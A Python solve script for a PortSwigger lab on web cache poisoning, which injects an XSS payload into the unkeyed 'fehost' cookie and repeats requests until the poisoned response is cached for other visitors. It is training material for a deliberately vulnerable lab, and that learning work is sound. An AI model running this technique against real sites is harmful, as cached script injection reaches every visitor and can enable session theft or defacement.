#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Web cache poisoning with an unkeyed cookie.

Injects a JS-breaking payload into the fehost cookie and sends
GET / until X-Cache: hit, poisoning the cached response.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = 'somehost"-alert(1)-"'


def main():
    parser = argparse.ArgumentParser(
        description="Solve Web Cache Poisoning Lab 2 (unkeyed cookie)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--payload", default=PAYLOAD, help="Cookie injection payload")
    parser.add_argument("--max-attempts", type=int, default=20)
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print(f"[*] Injecting fehost cookie: {args.payload}")
    for i in range(1, args.max_attempts + 1):
        r = s.get(f"{lab}/", cookies={"fehost": args.payload})
        cache_status = r.headers.get("X-Cache", "none")
        print(f"[{i}] X-Cache: {cache_status}")
        if cache_status == "hit":
            print("[+] Cache poisoned! Victims loading the home page will trigger alert(1).")
            return

    print("[-] Cache hit not observed — try more attempts.")


if __name__ == "__main__":
    main()
